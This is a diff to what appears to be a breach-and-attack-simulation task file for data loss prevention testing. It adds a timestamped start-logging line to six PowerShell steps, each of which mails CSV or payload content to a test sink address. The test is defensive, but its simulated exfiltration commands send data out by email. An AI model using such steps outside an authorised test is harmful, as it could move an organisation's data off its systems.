@@ -68,6 +68,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $body = "$token`n$csvContent"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
           -Subject $token -Body $body `
           -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
@@ -110,6 +111,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $body = "$token`n$payload"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
           -Subject $token -Body $body `
           -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
@@ -152,6 +154,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $body = "$token`n$payload"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
           -Subject $token -Body $body `
           -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
@@ -194,6 +197,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $body = "$token`n$payload"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
           -Subject $token -Body $body `
           -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
@@ -236,6 +240,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $body = "$token`n$payload"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
           -Subject $token -Body $body `
           -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
@@ -278,6 +283,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $body = "$token`n$payload"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
           -Subject $token -Body $body `
           -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
